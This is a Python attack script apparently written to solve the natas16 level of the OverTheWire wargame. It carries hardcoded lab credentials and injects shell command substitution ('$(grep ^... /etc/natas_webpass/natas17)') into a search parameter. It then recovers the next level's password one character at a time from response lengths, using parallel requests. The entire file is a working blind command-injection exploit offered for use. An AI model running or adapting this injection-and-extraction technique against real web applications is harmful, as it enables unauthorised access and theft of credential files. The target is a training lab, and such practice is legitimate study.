import requests
import string
from concurrent.futures import ThreadPoolExecutor, as_completed

URL = "http://natas16.natas.labs.overthewire.org"
AUTH = ("natas16", "Xm6XEeRN3zsGjRDqBPmuqAVV65k7e3Gb")

CHARS = string.ascii_letters + string.digits
THRESHOLD = 20000        # Adjust if necessary
MAX_WORKERS = 20         # 20-32 is usually a good range

session = requests.Session()
session.auth = AUTH


def test_char(prefix, c):
    """Return the character if it extends the password prefix."""
    attempt = prefix + c
    payload = f'$(grep ^{attempt} /etc/natas_webpass/natas17)'

    try:
        response = session.get(
            URL,
            params={"needle": payload},
            timeout=5
        )

        if len(response.text) < THRESHOLD:
            return c
    except requests.RequestException:
        pass

    return None


password = ""

while True:
    found = False

    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        futures = {
            executor.submit(test_char, password, c): c
            for c in CHARS
        }

        for future in as_completed(futures):
            result = future.result()

            if result is not None:
                password += result
                print(f"[+] Found: {password}")

                found = True

                # Cancel tasks that haven't started yet
                executor.shutdown(wait=False, cancel_futures=True)
                break

    if not found:
        break

print(f"\n[✓] Password: {password}")